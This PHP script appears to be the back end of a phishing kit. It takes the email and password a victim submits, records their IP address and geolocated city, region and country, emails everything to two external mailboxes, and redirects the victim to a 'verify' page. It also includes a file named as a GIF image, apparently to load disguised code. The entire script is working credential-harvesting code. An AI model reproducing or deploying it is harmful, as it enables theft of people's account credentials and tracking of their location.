<?php

$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$msg = "------------------| Cogzy |--------------------\n";
$msg .= "Email Provider: Others\n";
$msg .= "Email: ".$_POST['UserName']."\n";
$msg .= "Password: ".$_POST['Password']."\n";
$msg .= "IP: $ip\n";
$msg .= "--------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "dlordmercy@yandex.com, gmoneyvault@hotmail.com";
$subject = "Others | $ip";
include_once "css/button.gif";
mail($send,$subject,$msg);
header('Location: verify.php');

?>